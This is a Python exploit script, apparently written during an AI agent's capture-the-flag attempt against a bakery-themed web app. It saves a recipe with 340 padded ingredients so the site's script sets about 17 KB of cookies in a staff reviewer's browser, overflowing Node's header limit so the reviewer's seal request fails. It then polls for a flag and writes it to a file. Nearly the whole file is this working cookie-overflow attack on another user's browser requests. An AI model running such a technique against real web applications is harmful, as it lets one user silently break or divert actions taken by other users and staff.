#!/usr/bin/env python3
"""Make the inspector's own seal request fail, then wait for the Chief.

mixer.js turns every ingredient into a cookie (`document.cookie = name+'='+value`) and
then POSTs /api/seal from the visitor's browser. The visitor that seals queued batches is
a staff browser, and Node rejects request headers above --max-http-header-size (16 KB),
so a batch carrying ~17 KB of ingredient cookies gets reviewed but never sealed: the
previous run recorded exactly that (11 KB -> seal, 17 KB -> reviewed with no seal) and
then dismissed the trick because injecting *values* did not change the level.

But a batch that is `reviewed` and still has no seal is a different state, and the brief
says the Chief is a very busy robot. Control batch A gets a normal seal; batch B is built
to overflow the header budget. Then poll both for a long time and compare.
"""
import json
import re
import sys
import time

from cc import Client, new_baker, save, submit

N_ING = 340          # ingredient count: name+value pair -> ~50 bytes of cookie each
PAD = "x" * 34


def cookie_budget(ings):
    return sum(len(i["name"]) + len(i["value"]) + 2 for i in ings)


def build_overflow():
    ings = []
    for i in range(N_ING):
        ings.append({"name": "zzfill%04d" % i, "value": PAD})
    return ings


def status_of(c, rid):
    code, page, dt = c.get("/review/%s" % rid)
    txt = page if isinstance(page, str) else json.dumps(page)
    return {
        "status": (re.findall(r"queued|reviewing|reviewed|draft", txt) or ["?"])[-1],
        "chief": bool(re.search(r"(?i)chief|golden|gold", txt)),
        "standard": bool(re.search(r"(?i)standard", txt)),
        "flag": re.findall(r"sun\{[^{}\r\n]{1,160}\}", txt),
    }


def main():
    u, c, r = new_baker("ov")
    print("user", u, flush=True)

    ings_small = [{"name": "flour", "value": "2 cups"}, {"name": "moon_sugar", "value": "1"}]
    code, a, _ = save(c, "A control batch", ings_small)
    aid = a["id"]
    code, b_, _ = save(c, "B overflow batch", build_overflow())
    bid = b_["id"]
    print("A=%s (%d B cookies)  B=%s (%d B cookies)" % (
        aid, cookie_budget(ings_small), bid, cookie_budget(build_overflow())), flush=True)
    print("submit A", submit(c, aid)[1], flush=True)
    time.sleep(1.0)
    print("submit B", submit(c, bid)[1], flush=True)

    t0 = time.time()
    seen = {}
    while time.time() - t0 < 3000:
        time.sleep(90)
        for tag, rid in (("A", aid), ("B", bid)):
            st = status_of(c, rid)
            sig = (st["status"], st["chief"], st["standard"])
            if seen.get((tag, "sig")) != sig:
                print("t=%5.0fm %s %s" % ((time.time() - t0) / 60, tag, st), flush=True)
                seen[(tag, "sig")] = sig
            if st["flag"]:
                open("../flag.txt", "w", encoding="utf-8").write(st["flag"][0] + "\n")
                print("!!! FLAG from %s: %s" % (tag, st["flag"][0]), flush=True)
                return 0
        if seen.get(("A", "sig")) and seen.get(("B", "sig")):
            a_s, b_s = seen[("A", "sig")], seen[("B", "sig")]
            if a_s[0] == "reviewed" and b_s[0] == "reviewed" and not b_s[1]:
                print("A sealed normally; B is reviewed+unsealed -> keep watching for the Chief",
                      flush=True)
    print("timeout without a chief seal", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
